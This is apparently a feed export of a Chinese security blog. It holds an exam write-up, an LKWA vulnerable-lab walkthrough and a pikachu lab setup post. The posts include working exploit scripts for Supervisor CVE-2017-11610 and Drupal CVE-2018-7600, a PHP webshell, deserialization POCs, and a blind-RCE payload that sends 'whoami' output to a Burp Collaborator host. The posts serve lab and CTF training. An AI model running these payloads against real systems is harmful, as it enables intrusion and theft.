        <content type="html"><![CDATA[<h2 id="记4月5日360众测考核"><a href="#记4月5日360众测考核" class="headerlink" title="记4月5日360众测考核"></a>记4月5日360众测考核</h2><blockquote><p>群里的老哥们都说是墨者学院的题，而且拿到的key也有<code>mozhe</code>字样，所以想顺利通过可以看看墨者学院的题</p><p>注意是理论+实践共三小时，key一般在根目录下的key.txt或者key***.php中</p><p>还有就是全程必须挂着VPN，否则没分，实践部分总分600分就能通过（我当时是，现在好像降低标准了）</p><p>——Linuz</p></blockquote><h3 id="一、php弱类型"><a href="#一、php弱类型" class="headerlink" title="一、php弱类型"></a>一、php弱类型</h3><p>下载下来一个login.tar文件，解压后是login.php的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a1 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_POST[&apos;pass&apos;];</span><br><span class="line">$a2 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    if ($a != &apos;QNKCDZO&apos; &amp;&amp; $a1 == $a2) &#123;</span><br><span class="line">        /**</span><br><span class="line">        内容省略！</span><br><span class="line">         **/</span><br><span class="line">        exit();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &apos;&lt;script&gt;alert(\&apos;认证错误\&apos;);window.location.href=\&apos;/index.html\&apos;;&lt;/script&gt;&apos;;</span><br><span class="line">    &#125;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>CTF中很常见，php弱比较，比如输入一个<code>s878926199a</code>即可绕过</p><h3 id="二、数据库漏洞"><a href="#二、数据库漏洞" class="headerlink" title="二、数据库漏洞"></a>二、数据库漏洞</h3><p>打开靶机后发现是tcp协议，映射的原端口是873，说明是rsync服务</p><p><img src="/img/2020/04/05/H9718dd67fd6f44d9ae51958946371b0eG.png" alt></p><h3 id="三、网站后门"><a href="#三、网站后门" class="headerlink" title="三、网站后门"></a>三、网站后门</h3><p>题目提示网站被黑了，被黑客上传并篡改了一些文件。</p><p>可以下载网站源码，下载下来用D盾扫了一下就找到了后门的位置。</p><p><img src="/img/2020/04/05/H210da3441468447b9ec93eecc777ac55z.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$e = $_REQUEST[&apos;e&apos;];</span><br><span class="line">$arr = array($_POST[&apos;pass&apos;] =&gt; &apos;|.*|e&apos;,);</span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br></pre></td></tr></table></figure><p>菜刀链接构造方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx.xx:xxxxx/www/fields/class-wp-rest-comment-meta-style.php?e=preg_replace</span><br><span class="line"></span><br><span class="line">//连接密码pass</span><br></pre></td></tr></table></figure><h3 id="四、Supervisor远程命令执行漏洞（CVE-2017-11610）"><a href="#四、Supervisor远程命令执行漏洞（CVE-2017-11610）" class="headerlink" title="四、Supervisor远程命令执行漏洞（CVE-2017-11610）"></a>四、Supervisor远程命令执行漏洞（CVE-2017-11610）</h3><p><strong>EXP</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpc.client</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line">command = sys.argv[2]</span><br><span class="line">with xmlrpc.client.ServerProxy(target) as proxy:</span><br><span class="line">    old = getattr(proxy, &apos;supervisor.readLog&apos;)(0,0)</span><br><span class="line"></span><br><span class="line">    logfile = getattr(proxy, &apos;supervisor.supervisord.options.logfile.strip&apos;)()</span><br><span class="line">    getattr(proxy, &apos;supervisor.supervisord.options.warnings.linecache.os.system&apos;)(&apos;&#123;&#125; | tee -a &#123;&#125;&apos;.format(command, logfile))</span><br><span class="line">    result = getattr(proxy, &apos;supervisor.readLog&apos;)(0,0)</span><br><span class="line"></span><br><span class="line">    print(result[len(old):])</span><br></pre></td></tr></table></figure><p><strong>使用方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py &quot;http://your-ip:9001/RPC2&quot; &quot;command&quot;</span><br></pre></td></tr></table></figure><p>出处：</p><blockquote><p><a href="https://blog.51cto.com/eth10/1955450" target="_blank" rel="noopener">https://blog.51cto.com/eth10/1955450</a> </p></blockquote><h3 id="五、CVE-2018-7600"><a href="#五、CVE-2018-7600" class="headerlink" title="五、CVE-2018-7600"></a>五、CVE-2018-7600</h3><blockquote><p><a href="https://github.com/a2u/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/a2u/CVE-2018-7600</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">print (&apos;################################################################&apos;)</span><br><span class="line">print (&apos;# Proof-Of-Concept for CVE-2018-7600&apos;)</span><br><span class="line">print (&apos;# by Vitalii Rudnykh&apos;)</span><br><span class="line">print (&apos;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&apos;)</span><br><span class="line">print (&apos;# https://github.com/a2u/CVE-2018-7600&apos;)</span><br><span class="line">print (&apos;################################################################&apos;)</span><br><span class="line">print (&apos;Provided only for educational or information purposes\n&apos;)</span><br><span class="line"></span><br><span class="line">target = input(&apos;Enter target url (example: https://domain.ltd/): &apos;)</span><br><span class="line"></span><br><span class="line"># Add proxy support (eg. BURP to analyze HTTP(s) traffic)</span><br><span class="line"># set verify = False if your proxy certificate is self signed</span><br><span class="line"># remember to set proxies both for http and https</span><br><span class="line"># </span><br><span class="line"># example:</span><br><span class="line"># proxies = &#123;&apos;http&apos;: &apos;http://127.0.0.1:8080&apos;, &apos;https&apos;: &apos;http://127.0.0.1:8080&apos;&#125;</span><br><span class="line"># verify = False</span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">verify = True</span><br><span class="line"></span><br><span class="line">url = target + &apos;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&apos; </span><br><span class="line">payload = &#123;&apos;form_id&apos;: &apos;user_register_form&apos;, &apos;_drupal_ajax&apos;: &apos;1&apos;, &apos;mail[#post_render][]&apos;: &apos;exec&apos;, &apos;mail[#type]&apos;: &apos;markup&apos;, &apos;mail[#markup]&apos;: &apos;echo `cat /key.txt` | tee hello.txt&apos;&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, proxies=proxies, data=payload, verify=verify)</span><br><span class="line">check = requests.get(target + &apos;hello.txt&apos;, proxies=proxies, verify=verify)</span><br><span class="line">if check.status_code != 200:</span><br><span class="line">  sys.exit(&quot;Not exploitable&quot;)</span><br><span class="line">print (&apos;\nCheck: &apos;+target+&apos;hello.txt&apos;)</span><br></pre></td></tr></table></figure><p>以上是修改后的exp，利用完以后访问hello.txt即可拿到key。</p><h3 id="六、数据分析（一）"><a href="#六、数据分析（一）" class="headerlink" title="六、数据分析（一）"></a>六、数据分析（一）</h3><p>很简单，但是分值却很高</p><p>如果下载下来数据包名为<code>20.pcapng</code>即可用此方法</p><p>根据提示说黑客利用一句话木马在数据库中添加了一个身份证号</p><p>这里用了一个笨方法，先是搜了一下字符串，得到了一个名为<code>xiaoma.php</code>的文件</p><p><img src="/img/2020/04/05/H2c713eaecfe74950a5f0bee34bc01105a.png" alt></p><p>总共<code>xiaoma.php</code>这个文件也没调用几次，跟踪一下HTTP流得到一些信息</p><p><img src="/img/2020/04/05/He6b9031a038843acbea1fcbe00ba748eg.png" alt></p><p>解密后发现执行了数据库操作，然后找了几次找到了添加身份证号的SQL语句</p><p><img src="/img/2020/04/05/Hf4e1228a36b24848a7b596aac76552d4W.png" alt></p><h3 id="七、数据分析（二）"><a href="#七、数据分析（二）" class="headerlink" title="七、数据分析（二）"></a>七、数据分析（二）</h3><p>巨简单。。。如果下载下来数据包名为<code>21.pcapng</code>即可用此方法</p><p>题目提示黑客上传了一句话木马，需要找到黑客的IP地址</p><p>思路就是过滤一下POST请求，找到upload一类的字眼即可</p><p><img src="/img/2020/04/05/H236f68666c7a445497ad54208f6d8a47x.png" alt></p><p><strong>题目资源已上传百度云：</strong></p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1xeTG3gqstznjeU0bXTdS0Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1xeTG3gqstznjeU0bXTdS0Q</a><br>提取码：sod3</p></blockquote><p><strong>最终以62.8的超低分幸运的通过了考核，不得不感叹自己真是太菜了。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 众测 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场推荐——LKWA</title>
      <link href="/2020/01/22/LKWA/"/>
      <url>/2020/01/22/LKWA/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在Github上面发现了一个不错的Web漏洞练习靶场——LKWA，它包含了八种Web漏洞：</p><ul><li>Blind RCE</li><li>XSSI</li><li>PHP Object Injection</li><li>PHP Object Injection via Cookies</li><li>PHP Object Injection (Object Reference)</li><li>PHAR Deserialization</li><li>SSRF</li><li>Variables variable</li></ul><blockquote><p>项目地址：<a href="https://github.com/weev3/LKWA" target="_blank" rel="noopener">https://github.com/weev3/LKWA</a></p></blockquote><h1 id="搭建方法"><a href="#搭建方法" class="headerlink" title="搭建方法"></a>搭建方法</h1><h2 id="官方部署"><a href="#官方部署" class="headerlink" title="官方部署"></a>官方部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/weev3/LKWA</span><br></pre></td></tr></table></figure><p>然后进入该目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p>然后访问<code>http://ip:3000</code>即可。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>对于<code>XSSI</code>实验，需要把<code>apache2.conf</code>配置文件中的<code>Allow Override None</code>改成<code>Allow Override ALL</code></p><p>对于<code>PHAR Deserialization</code>实验，需要把<code>php.ini</code>配置文件中的<code>phar.readonly = On</code>改成<code>phar.readonly = Off</code></p><h2 id="非官方部署"><a href="#非官方部署" class="headerlink" title="非官方部署"></a>非官方部署</h2><p>由于按照官方的搭建方法有的实验无法复现，所以重写了Dockerfile，并且配置文件也改好了。</p><p>镜像已上传到Dockerhub。</p><p>具体使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull area39/lkwa:latest</span><br><span class="line">docker run -d -p 3000:80 area39/lkwa:latest</span><br></pre></td></tr></table></figure><p>然后访问<code>http://ip:3000</code>就能看到LKWA靶场啦。</p><p><img src="/img/2020/01/22/H89605e26f42c4b138c1505f4f4f5b0517.png" alt></p><h1 id="实验复现方法"><a href="#实验复现方法" class="headerlink" title="实验复现方法"></a>实验复现方法</h1><h2 id="实验一：Blind-RCE"><a href="#实验一：Blind-RCE" class="headerlink" title="实验一：Blind RCE"></a>实验一：Blind RCE</h2><p><code>blind_rce.php</code>代码部分：</p><p><img src="/img/2020/01/22/Hf0cbe1e8a8284fbf9593ade2049b2f7aq.png" alt></p><p>在第10行由POST方式传入<code>user_input</code>变量的值，然后使用exec函数执行了<code>user_input</code>值，并且没有回显输出。</p><p>此时我们可以结合Burpsuite Collaborato模块来查看输出。</p><p><img src="/img/2020/01/22/He23ef63d225342c19b8f4897fc4e41cel.png" alt></p><p><img src="/img/2020/01/22/H117c05ea2b584a9dbd01f578dd7bb87fL.png" alt></p><p><img src="/img/2020/01/22/Hcb6554d7e9d44a1ab101c9ae7ff7100az.png" alt></p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.xxx.burpcollaborator.com</span><br></pre></td></tr></table></figure><p><img src="/img/2020/01/22/Ha70f84150d424afd87daacd09a6384e1Y.png" alt></p><p><img src="/img/2020/01/22/H863b7b4c62ed49c397b1c8140dc6603cv.png" alt></p><h2 id="实验二：XSSI"><a href="#实验二：XSSI" class="headerlink" title="实验二：XSSI"></a>实验二：XSSI</h2><blockquote><p><a href="https://stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi" target="_blank" rel="noopener">https://stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi</a></p></blockquote><p>使用用户名<code>admin</code>密码<code>password</code>登录，然后可以看到用户名和随机token。</p><p><img src="/img/2020/01/22/H9961679589a340d18bbc0decbfd622ac4.png" alt></p><p>用户名和令牌是使用ajax检索的，如下所示:</p><p><img src="/img/2020/01/22/H4065925df58740068f0c35c83a3e8d95d.png" alt></p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSSI&lt;/title&gt;    </span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function a(s)</span><br><span class="line">        &#123;</span><br><span class="line">        alert(JSON.stringify(s));</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;http://ip:3000/api/user?callback=a&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>保存成xssi.php，在本地搭建好，然后访问该URL获取token。</p><p><img src="/img/2020/01/22/Ha2344d1f67b14e23b080781b957e87beB.png" alt></p><h2 id="实验三：PHP-Object-Injection"><a href="#实验三：PHP-Object-Injection" class="headerlink" title="实验三：PHP Object Injection"></a>实验三：PHP Object Injection</h2><blockquote><p><a href="https://blog.csdn.net/qq_19876131/article/details/50926210" target="_blank" rel="noopener">https://blog.csdn.net/qq_19876131/article/details/50926210</a></p></blockquote><p>在该实验中，单击提交按钮后，一些序列化数据将会添加到url中，如下图所示：</p><p><img src="/img/2020/01/22/Hb58e60ad1e6c4c7a91e1fc985cc1e5e8s.png" alt></p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo&#123;</span><br><span class="line">    function __construct($filename, $data) &#123;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents($this-&gt;filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new Foo(&quot;test.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后运行上面的脚本</p><p><img src="/img/2020/01/22/H1a67e3963a524dca9b6c2ec996d47e00I.png" alt></p><p>复制序列化的输出字符串，将其替换为object参数的值，然后发送请求。</p><p><img src="/img/2020/01/22/Hab0dbeaa180b465282a58ce67c3e8adeE.png" alt></p><p>然后就可以看到有个<code>test.php</code>文件被创建。</p><p><img src="/img/2020/01/22/H7236249c856340e9abc2657352f5da3eR.png" alt></p><h2 id="实验四：PHP-Object-Injection-via-Cookies"><a href="#实验四：PHP-Object-Injection-via-Cookies" class="headerlink" title="实验四：PHP Object Injection via Cookies"></a>实验四：PHP Object Injection via Cookies</h2><p>该实验与实验三相同，唯一的区别是对象注入发生在cookie中。</p><p>使用用户名<code>admin</code>密码<code>password</code>登录，一些序列化数据将添加到cookie中。</p><p><img src="/img/2020/01/22/He12e0c6d2df74fa7b743a47b0cdb0c7d5.png" alt></p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * Object Injection via Cookie</span><br><span class="line"> */</span><br><span class="line">class Foo&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new Foo();</span><br><span class="line">$a-&gt;cmd = &quot;phpinfo();&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/2020/01/22/Hf11bc18363dd4c0a9d97ed0bc5078500T.png" alt></p><p>然后将输出的字符串替换cookie(注意符号URL转义)。</p><p><img src="/img/2020/01/22/H80a8e40b21124b0e8095713598121156m.png" alt></p><p><img src="/img/2020/01/22/Hc160f8632c88421686e9ec00ba846723h.png" alt></p><h2 id="实验五：PHP-Object-Injection-Object-Reference"><a href="#实验五：PHP-Object-Injection-Object-Reference" class="headerlink" title="实验五：PHP Object Injection (Object Reference)"></a>实验五：PHP Object Injection (Object Reference)</h2><p>看到一个输入框，随便输一个试试，他会提示Loser!!!!</p><p><img src="/img/2020/01/22/H47762c88932d424587ec959721962ef2E.png" alt></p><p>代码部分:</p><p><img src="/img/2020/01/22/Hdd7593b760c6449ba514c4fd789f35d4t.png" alt></p><p>如图所示，它让我们的输入数字和序列化数据，然后将输入的数字与随机生成的密码进行比较。如果输入的数字与该密码匹配，则表明Win，否则Loser。</p><p>明显这是不可能的，但是可以想办法绕开，从而获得Win。</p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Object1</span><br><span class="line">&#123;</span><br><span class="line">  var $guess;</span><br><span class="line">  var $secretCode;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new Object1();</span><br><span class="line">$a-&gt;guess =  &amp;$a-&gt;secretCode;</span><br><span class="line"> </span><br><span class="line">echo serialize($a);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/2020/01/22/H6629a8ca101b4a0ab8858a973b5dfb78i.png" alt></p><p><img src="/img/2020/01/22/H1eeddd1b67ae4b4e9eb9ee96f4c2a20a7.png" alt></p><h2 id="实验六：PHAR-Deserialization"><a href="#实验六：PHAR-Deserialization" class="headerlink" title="实验六：PHAR Deserialization"></a>实验六：PHAR Deserialization</h2><blockquote><p><a href="https://www.freebuf.com/articles/web/182231.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182231.html</a></p></blockquote><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// create new Phar</span><br><span class="line">@unlink(&quot;pharfile.phar&quot;);</span><br><span class="line">$phar = new Phar(&apos;pharfile.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;test.txt&apos;, &apos;data&apos;);</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ? &gt;&apos;);</span><br><span class="line"> </span><br><span class="line">// add object of any class as meta data</span><br><span class="line">class log</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new log;</span><br><span class="line">$object-&gt;filename = &apos;shell.php&apos;;</span><br><span class="line">$object-&gt;data = &apos;&lt;?php phpinfo();?&gt;&apos;;</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后会在本目录下生成一个<code>pharfile.phar</code>文件，然后把该文件上传</p><p><img src="/img/2020/01/22/H0fda91bd4e75420fbe92ace94adff942c.png" alt></p><p><img src="/img/2020/01/22/H45126c8a82c74a38a162216d889c6225l.png" alt></p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:3000/phar_deserial/phar_deserial.php?file=phar://uploads/pharfile.phar</span><br></pre></td></tr></table></figure><p><img src="/img/2020/01/22/H8d56ab197cfa41df82ec7ebf934ff031s.png" alt></p><h2 id="实验七：SSRF"><a href="#实验七：SSRF" class="headerlink" title="实验七：SSRF"></a>实验七：SSRF</h2><p>在输入框中输入一个图片的url，将会在页面中显示出来</p><p><img src="/img/2020/01/22/H852bfb0bdded42eea939a5e7624df6cde.png" alt></p><p>代码部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;sidebar.php&quot;);</span><br><span class="line">if (isset($_GET[&apos;image&apos;])) &#123;</span><br><span class="line"># code...</span><br><span class="line">echo file_get_contents($_GET[&apos;image&apos;], true);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码比较简单，也可以包含<code>/etc/passwd</code>之类的本地文件。</p><p><img src="/img/2020/01/22/H52c5e58cc19a49e893f74b0c38428008D.png" alt></p><h2 id="实验八：Variables-variable"><a href="#实验八：Variables-variable" class="headerlink" title="实验八：Variables variable"></a>实验八：Variables variable</h2><blockquote><p><a href="https://www.exploit-db.com/papers/13182" target="_blank" rel="noopener">https://www.exploit-db.com/papers/13182</a></p></blockquote><p>在输入框中输入一些值，然后就会<code>var_dump</code>输出你输入的值。</p><p><img src="/img/2020/01/22/H6777492759914a17b0e78d5d6021a6f2n.png" alt></p><p>代码部分：</p><p><img src="/img/2020/01/22/Hf95fd4d7c24b4bf9a945065f1f66ffa7E.png" alt></p><p>如果以GET方式传入<code>func</code>和<code>input</code>的值，则将<code>func</code>的值添加到<code>$var</code>变量中，然后会将<code>$var</code>变量添加到动态变量中。</p><p>该动态变量可控，我们可以把<code>var_dump</code>换成<code>assert</code>或者<code>passthru</code>等等。</p><p><img src="/img/2020/01/22/H07515d3e24164f9fbdf72aa3de16edecx.png" alt><br><img src="/img/2020/01/22/H982ec9a579cf40e6a6adb2867dce8533J.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 平台搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场推荐——pikachu</title>
      <link href="/2020/01/05/pikachu/"/>
      <url>/2020/01/05/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场推荐——pikachu"><a href="#靶场推荐——pikachu" class="headerlink" title="靶场推荐——pikachu"></a>靶场推荐——pikachu</h1><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p></blockquote><p>为了方便大家使用已经push到了docker hub。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull area39/pikachu:latest</span><br><span class="line">docker run -d -p 8000:80 area39/pikachu:latest</span><br></pre></td></tr></table></figure><h2 id="Pikachu上的漏洞类型列表如下"><a href="#Pikachu上的漏洞类型列表如下" class="headerlink" title="Pikachu上的漏洞类型列表如下"></a>Pikachu上的漏洞类型列表如下</h2><ul><li>Burt Force(暴力破解漏洞)</li><li>XSS(跨站脚本漏洞)</li><li>CSRF(跨站请求伪造)</li><li>SQL-Inject(SQL注入漏洞)</li><li>RCE(远程命令/代码执行)</li><li>Files Inclusion(文件包含漏洞)</li><li>Unsafe file downloads(不安全的文件下载)</li><li>Unsafe file uploads(不安全的文件上传)</li><li>Over Permisson(越权漏洞)</li><li>../../../(目录遍历)</li><li>I can see your ABC(敏感信息泄露)</li><li>PHP反序列化漏洞</li><li>XXE(XML External Entity attack)</li><li>不安全的URL重定向</li><li>SSRF(Server-Side Request Forgery)</li></ul><h2 id="安装效果"><a href="#安装效果" class="headerlink" title="安装效果"></a>安装效果</h2><p><img src="/img/2020/01/05/Hb714f67b51674425989fccc7b0d439efK.png" alt><br><img src="/img/2020/01/05/Hd3cc8520cde84b28813d272b804bc9c05.png" alt></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.初次使用需要点一下初始化安装<br><img src="/img/2020/01/05/He46b0d11bcaa4ff594b40e1b3f494c71z.png" alt><br><img src="/img/2020/01/05/Hc5bca1c6889641baa1e8735df4f3c07ct.png" alt><br>2.结合CTFd的CTFd-Whale插件食用更佳~<br><img src="/img/2020/01/05/H6574c1644a0a48868c0dfe68071cefc1y.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 靶机搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CanHackMe | CTF平台搭建记录</title>
      <link href="/2019/09/12/CanHackMe/"/>
      <url>/2019/09/12/CanHackMe/</url>
      
